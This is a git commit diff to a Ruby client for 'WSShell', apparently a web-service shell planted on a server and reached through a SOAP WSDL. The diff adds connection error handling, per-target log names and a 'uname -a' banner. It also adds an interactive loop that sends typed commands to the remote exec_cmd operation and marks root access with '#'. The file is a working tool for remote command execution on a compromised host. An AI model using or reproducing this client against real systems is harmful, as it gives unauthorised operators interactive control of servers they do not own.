e80b1ff30dbb09cd025d0622f7cc8277dcdb36b1
Felipe Molina <felmoltor@gmail.com>
2013-10-31 18:23:30 +0100

    Add banners and logging filenames improvements. Shows a '#' when the user has UID == 0

--- wsshellclient.rb
+++ wsshellclient.rb
@@ -7,11 +7,12 @@
 # TODO: Encode response in base64
 # TODO: Bug with Axis2. Change the requests headers it an Axis2 is using <base> tag to redirect to an internal IP. Configure endpoint on client.
 
+require 'uri'
 require 'savon'
 require 'optparse'
 
 class WSShellClient
-    attr_accessor :username, :hostname, :path, :userid
+    attr_accessor :username, :hostname, :path, :userid, :got_shell
     @wsdlShellURL = nil
     @outputLog = "shell_access.log"
 
@@ -22,21 +23,39 @@ class WSShellClient
         @userid = -1
         @hostname = "<NO_HOSTNAME>"
         @path = "<NO_PATH>"
-        @wsshellclient = Savon.client(wsdl: @wsdlShellURL)
-        @wsshellclient.globals[:logger] = Logger.new(@outputLog)
-        @wsshellclient.globals[:logger].level = 10
-        getCurrentContext
-    end
+        @currentpath=@path
+        @got_shell = true
+        begin
+            @wsshellclient = Savon.client(wsdl: @wsdlShellURL)
+            @wsshellclient.globals[:logger] = Logger.new(@outputLog)
+            @wsshellclient.globals[:log] = false
+            getCurrentContext
+        rescue Wasabi::Resolver::HTTPError => e
+            $stderr.puts "Error retrieving the WSDL file from #{@wsdlShellURL}: #{e.message}"
+            @wsshellclient = nil
+            @got_shell = false
+        end
+     end
     
     #exec_cmd, get_file_list, get_info, get_root_dir, read_file
 
     def executeCommand(cmd)
-        response = @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
+        m = cmd.strip.match(/^cd (.*)/)
+        if (!m.nil? and !m[1].nil?)
+            # puts "STUB: Changing directory [FAKE MODE]"
+            @currenpath=m[1]
+            response =  @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
+            # TODO: Check if the cd was success or not
+        else
+            # TODO: Before executing any command, cd to @currentpath
+            # puts "STUB: before executing #{cmd} changing to #{@currentpath} [FAKE MODE]"
+            response = @wsshellclient.call(:exec_cmd, message: {cmd: cmd})
+        end
         return response.body[:exec_cmd_response][:return]
     end
 
     def getRawAvailableFunctions
-        response = @wsshellclient.operations.sort.join("\n")
+        response = "\n#{@wsshellclient.operations.sort.join("\n")}"
         return response
     end
 
@@ -75,22 +94,43 @@ end
 
 wsdl = ARGV[0]
 
-wsshell = WSShellClient.new(wsdlwsshellurl = wsdl, outputlog = "wsshell_#{DateTime.now.strftime("%Y%m%d_%H%M%S")}.log")
+wsdluri = URI(wsdl)
 
-puts "="*220
-puts "= SYSTEM INFORMATION ="
-puts "= System Information: #{wsshell.getSystemInfo}"
-puts "= Available WS calls: #{wsshell.getRawAvailableFunctions}"
-puts "="*20
-puts 
-while(1)
-    wsshell.getCurrentContext
-    print "#{wsshell.username}@#{wsshell.hostname}:#{wsshell.path}$ "
-    c = $stdin.gets.strip
-    if c != "exit"
-        puts wsshell.executeCommand(c)
-    else
-        puts "Bye, bye..."
-        break
+wsshell = WSShellClient.new(wsdlwsshellurl = wsdl, outputlog = "wsshell_#{DateTime.now.strftime("%Y%m%d_%H%M%S")}_#{wsdluri.host}_#{wsdluri.port}.log")
+
+if wsshell.got_shell 
+    sys = wsshell.executeCommand('uname -a')
+    puts "="*(sys.size+4)
+    puts "= #{sys} ="
+    puts "="*(sys.size+4)
+    puts 
+    puts " ********************************************************************"
+    puts " * WARNING: This is not a real shell (WSShell is a shit...), thus,  *"
+    puts " * you won't be able to do a lot of things like:                    *"
+    puts " * - Change the directory with a cd                                 *"
+    puts " * - Concatenate commands with operators like '||' or '&&' or ';',  *"
+    puts " *    the server will ignore it                                     *"
+    puts " * - Redirect outputs with operators like '>' or '<'                *"
+    puts " * - echo environment variables (echo $USERNAME won't work)         *"
+    puts " * - All those functionalities can be \"added\" with WSShell2 (TODO)*"
+    puts " ********************************************************************"
+    puts 
+
+    while(1)
+        wsshell.getCurrentContext
+        psterm = "$"
+        if wsshell.userid.to_i == 0
+            psterm = "#"
+        end
+        print "#{wsshell.username}@#{wsshell.hostname}:#{wsshell.path}#{psterm} "
+        c = $stdin.gets.strip
+        if c != "exit"
+            if c.to_s.size > 0
+                puts wsshell.executeCommand(c)
+            end
+        else
+            puts "Bye, bye..."
+            break
+        end
     end
 end
